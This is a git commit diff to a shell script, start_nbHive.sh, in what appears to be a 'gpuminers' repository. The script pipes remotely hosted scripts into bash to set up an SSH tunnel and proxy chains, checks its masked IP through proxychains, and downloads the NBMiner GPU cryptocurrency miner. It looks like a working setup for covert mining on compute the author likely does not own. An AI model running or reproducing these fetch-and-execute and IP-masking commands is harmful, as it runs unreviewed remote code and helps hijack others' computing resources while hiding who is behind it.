a01c7fe22ffe287b302a676e7e2a1ab84c97e954
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-03-25 02:14:05 +0200

    Update start_nbHive.sh

--- start_nbHive.sh
+++ start_nbHive.sh
@@ -1,20 +1,7 @@
 #!/bin/sh
-wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/SetUpSSHTunnelWithSLES81.sh | bash
 wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
-sleep .1
-echo "Sleeping a lil bit"
-echo "Sleeping a lil bit"
-echo "Sleeping a lil bit"
-echo "Sleeping a lil bit"
-echo "Sleeping a lil bit"
-echo "Sleeping a lil bit"
 proxychains curl ifconfig.me
-echo "Sleeping a lil bit"
-echo "Sleeping a lil bit"
-echo "Sleeping a lil bit"
-echo "Sleeping a lil bit"
-echo "Sleeping a lil bit"
-echo "Sleeping a lil bit"
 proxychains wget https://github.com/NebuTech/NBMiner/releases/download/v36.1/NBMiner_36.1_Linux.tgz
 tar -xvzf NBMiner_36.1_Linux.tgz
 cd NBMiner_Linux
